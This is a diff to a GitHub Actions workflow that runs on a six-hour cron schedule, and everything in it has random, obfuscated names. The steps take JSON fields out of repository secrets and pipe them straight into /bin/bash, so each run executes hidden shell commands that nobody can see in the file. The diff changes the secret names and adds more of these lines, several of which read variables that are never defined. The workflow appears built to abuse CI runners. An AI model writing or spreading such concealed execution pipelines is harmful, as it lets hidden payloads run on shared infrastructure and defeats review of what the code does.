@@ -3,22 +3,25 @@ name: yujinchou3413
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 1/6 * * *'
+    - cron: '29 3/6 * * *'
 
-jobs:  # 16148
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yujinchou3413
         env:
-          q76: ${{ secrets.q76 }}
+          evgf00: ${{ secrets.evgf00 }}
         run: |
-          echo $q76 | jq -r .r2437 | /bin/bash
-          echo $gbhb365 | jq -r .jeg76298 | /bin/bash
-          echo $fm2 | jq -r .zriu4 | /bin/bash
-          echo $la508 | jq -r .oi492 | /bin/bash
-          echo $u114 | jq -r .pqu85814 | /bin/bash
-          echo $zbxn4 | jq -r .f73137 | /bin/bash
-          echo $fp6285 | jq -r .alhu9 | /bin/bash
+          echo $evgf00 | jq -r .v57 | /bin/bash
+          echo $s98 | jq -r .dc63 | /bin/bash
+          echo $xwjx9183 | jq -r .xom54 | /bin/bash
+          echo $tld2 | jq -r .u565 | /bin/bash
+          echo $pljde9 | jq -r .idzfo578 | /bin/bash
+          echo $ya37243 | jq -r .kylq39378 | /bin/bash
+          echo $l404 | jq -r .auy12117 | /bin/bash
+          echo $tmp8 | jq -r .uzdg138 | /bin/bash
+          echo $stcr60904 | jq -r .ydcc343 | /bin/bash
+          echo $x52 | jq -r .ub0 | /bin/bash
 
